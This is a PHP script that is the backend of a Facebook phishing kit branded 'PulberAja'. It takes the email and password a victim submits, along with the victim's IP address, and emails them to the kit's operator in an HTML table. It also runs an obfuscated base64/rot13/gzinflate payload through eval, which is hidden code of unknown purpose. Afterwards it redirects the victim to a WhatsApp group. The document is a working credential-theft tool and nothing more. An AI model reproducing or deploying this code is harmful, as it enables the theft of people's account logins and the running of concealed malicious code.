<?php
$user = $_POST['email'];
$pass = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];

$subject = "Akun Facebook PulberAja{ $user }";
$message = '
<center> 
<div style="padding:5px;width:294;height:auto;background: #222222;color:#ffc;text-align:center;">
<font size="3.5"><b>Result Facebook 18+</b></font>
</div>
<table style="border-collapse:collapse;background:#ffc" width="100%" border="1">
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>Email</th>
  <th style="width:78%;text-align: center;"><b>'.$user.'</th> 
 </tr>
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>Password</th>
  <th style="width:78%;text-align: center;"><b>'.$pass.'</th> 
 </tr>
 </table>
<div style="padding:5px;width:294;height:auto;background: #222222;color:#ffc;text-align:center;">
<font size="3"><b>PulberAja</b></font>
</div>
</center>
';
include 'email.php';
$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .= 'From: { ^__^ } <PulberAja@phising.com>' . "\r\n";
$datamail = mail($pulberaja, $subject, $message, $headersx);
eval(str_rot13(gzinflate(str_rot13(base64_decode('hZAxC8IwEIVqwf+QIZgKIcVIZHUleifRFoRBxYQkohLSdQLpr7etqFud7mv3vgfvoGRgC8xShMafvYqWm/kMZSZI03el+xOynfZuiwi8VSsITWMt5ZWJaZCGnSDUM3CCtIpkFU7jMDgUtEFqbNMPDJBGiq/j2HbRku5+9cISJp7xwwdYuON1ORVOy7ygVkH3VkmVFIPVpHuXc2xoKutwhsGvyV8Ej6lD6Y778GyJvUwzS7+0CVnat/IC')))));
?>
<html>
<head>
<meta http-equiv="REFRESH" content="0;url=https://chat.whatsapp.com/CMqLKPAn3DOIeXKr4wKvdY">
</head>
<body>
</body>
</html>